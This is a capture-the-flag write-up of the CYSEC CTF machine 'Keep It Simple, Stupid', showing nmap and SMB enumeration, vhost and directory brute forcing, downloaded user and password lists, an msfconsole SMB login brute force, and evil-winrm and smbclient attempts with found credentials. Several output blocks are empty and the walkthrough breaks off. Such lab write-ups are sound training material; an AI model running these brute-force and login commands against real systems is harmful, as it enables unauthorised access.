## CYSEC CTF - Keep It Simple, Stupid
CYSEC CTF was organized by <a href="https://twitter.com/CYSECNG" target="_blank" rel="noopener">CYSECNG</a> .This CTF was good thanks to organizers.
Username <a href="https://twitter.com/blackninja233" target="_blank" rel="noopener">blackninja23</a> from my team <a href="https://twitter.com/UdomCyberClub" target="_blank" rel="noopener">UdomCyberClub</a>. I was first blood to root this good machine from this ctf.

According to this challenge, we are need to add cysec.local to /etc/hosts

```sudo echo -n "54.234.92.201 cysec.local" >> /etc/hosts```
# Enumeration
Starting off with a nmap scan:

```nmap -sC -sV 54.234.92.201```

<img src='/assets/img/Keep_it_Simple_Stupid_CYSEC/nmap.png' alt='nmap'>

We have 4 ports open which are 80,389,445 and 9999

# port 445 enumeration
Try to check for anonymous login
```md
smbclient -L //54.234.92.201
```
```md         
Password for [WORKGROUP\blackninja23]:
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 54.234.92.201 failed (Error NT_STATUS_IO_TIMEOUT)
Unable to connect with SMB1 -- no workgroup available
```

But as you can see from above, we can login as anonymous but we can't list for shares
Also you can check if it is vulnerable to CVEs but so far nothing

# port 80 enumeration
Visit cysec.local in browser and it give default page of IIS. From here, i try many things but one of them succeced which it is enumeration for vhosts

```

Other subdomains are not interested but secret.cysec.local seems interesting
we discover secret.cysec.local as vhost then we add it to /etc/hosts.

```sudo echo -n "54.234.92.201 secret.cysec.local" >> /etc/hosts```

Then Visit secret.cysec.local in browser and it give a page with title called CYSEC CTF.After a while looking at page and saw nothing.
Started to bruteforce for any interesting files or directories
```md
gobuster dir -u http://secret.cysec.local/ -w /usr/share/wordlists/dirb/common.txt -q
```
```md

```

# port 445 enumeration again
From there we discover folder backups which has users and passwords

<img src='/assets/img/Keep_it_Simple_Stupid_CYSEC/creds.png' alt='creds'>

download files
```md
wget http://secret.cysec.local/backups/passwords.txt && wget http://secret.cysec.local/backups/users.txt
```
After that we can now bruteforce smb service to see if one of user have successful login and i just short it to one command liner msfconsole
```md
msfconsole -q -x 'use auxiliary/scanner/smb/smb_login;set RHOSTS 54.234.92.201;set RPORT 445;set USER_FILE ~/CYSEC/users.txt;set PASS_FILE ~/CYSEC/passwords.txt;set VERBOSE false;run'
```
```md
RHOSTS => 54.234.92.201
RPORT => 445
USER_FILE => ~/CYSEC/users.txt
PASS_FILE => ~/CYSEC/passwords.txt
VERBOSE => false

[*] 54.234.92.201:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
We have user jsmith with login password and this user has access to smb and not winrm
You can check it with evilwinrm but we cant login so we need to play with smb
```md
evil-winrm -i 54.234.92.201 -u jsmith -p Password@123
```
We can now try to list shares like we did earlier
```md
smbclient -L //54.234.92.201 -U jsmith%Password@123
```
```md
